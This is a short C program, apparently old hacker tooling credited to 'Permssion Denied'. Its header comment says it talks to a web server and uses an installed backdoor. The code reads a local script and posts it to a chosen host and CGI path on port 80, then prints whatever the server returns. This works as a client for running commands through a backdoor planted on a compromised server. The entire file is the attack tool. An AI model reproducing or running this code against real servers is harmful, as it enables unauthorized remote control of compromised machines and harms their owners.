// useCGIback.c - by Permssion Denied
// this programs makes connection with WWW server and uses installed
// backdoor

#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>

main (int argc, char **argv)
{
 struct sockaddr_in sin;
 char buf[1000];
 long len = 0, a;
 int f, sock;
 struct hostent *phe;

 if(argc != 4) {
  printf("Usage:\n %s <script-name> <host> <location>\n", argv[0]);
  return 1;
 }
 if((f = open(argv[1], O_RDONLY))<0) {
  printf("%s: Bad file name %s\n", argv[0], argv[1]);
  return 1;
 }
 do {
  a = read(f, &buf, 1000);
  len += a;
 } while(a > 0);
 len -= a;
 lseek(f, 0, SEEK_SET);
 printf("Data length: %d\n", len);
 printf("Looking for address of %s: ", argv[2]);
 bzero((char *) &sin, sizeof(sin));
 sin.sin_family = AF_INET;
 sin.sin_port = htons(80);
 if (phe = gethostbyname (argv[2]))
  bcopy(phe -> h_addr, (char *) &sin.sin_addr, phe -> h_length);
  else
  {
   printf("failed\n", argv[0]);
   return 1;
  }
 printf("found\n");
 if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP))<0) {
  printf("%s: Cannot open socket\n", argv[0]);
  return 1;
 }
 if (connect(sock, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
  printf("%s: Cannot connect: %d\n", argv[0], errno);
  return 1;
 }
 printf("Transmiting header: ");
 sprintf(buf, "POST %s HTTP/1.0\nContent-Length: %d\n\n", argv[3], len);
 write(sock, &buf, strlen(buf));
 printf("done\n---\n");
 while((a = read(f, &buf, 1000)) > 0) write(sock, &buf, a);
 close(f);
 while((a = read(sock, &buf, 1000)) > 0) write(fileno(stdout), &buf, a);
}